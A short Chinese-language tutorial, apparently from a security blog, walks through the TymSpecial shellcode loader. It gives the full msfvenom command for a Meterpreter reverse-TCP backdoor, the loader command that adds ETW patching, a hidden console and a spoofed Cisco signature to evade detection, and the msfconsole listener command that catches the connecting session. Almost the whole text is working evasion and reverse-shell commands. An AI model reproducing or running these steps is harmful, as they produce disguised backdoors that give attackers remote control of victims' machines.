**一、简介**  

TymSpecial 是一个 shellcode 加载器，它利用 SysWhispers 进行直接系统调用并避免用户级挂钩。加载程序将原始 x64 无阶段 shellcode 作为输入，然后使用**随机**密钥进行 XOR 加密，并将临时 C++ 存根写入磁盘，该存根通过 g++ 编译以生成可执行文件。

**五、操作**  

**(一)msf测试**

生成测试后门文件msf64.bin

msfvenom -p windows/x64/meterpreter/reverse\_tcp lhost=192.168.31.187 lport=3333 -f raw -o msf64.bin

![](../Images/644d572c5ffed6a946c03161fa2335cd.png)

  

生成msf64.exe文件。

python3 TymSpecial.py --input msf64.bin --method 1 --etw  --hideconsole --domain cisco.com --out msf64

![](../Images/c8c81731b7d442beb106f786b8a76d32.png)

  

生成的shellcode添加思科的数字签名，所以有点慢。

![](../Images/6a1d775ff781acf14280184682647b7a.png)

  

思科数字签名  

![](../Images/3242a21a1bc584c9a020bd832a712c5c.png)

  

msf开启监听

msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse\_tcp; set lhost 192.168.31.187; set lport 3333; run"

  

![](../Images/c96d4e840f81e0aa62e0332c6865f38c.png)

  

成功上线
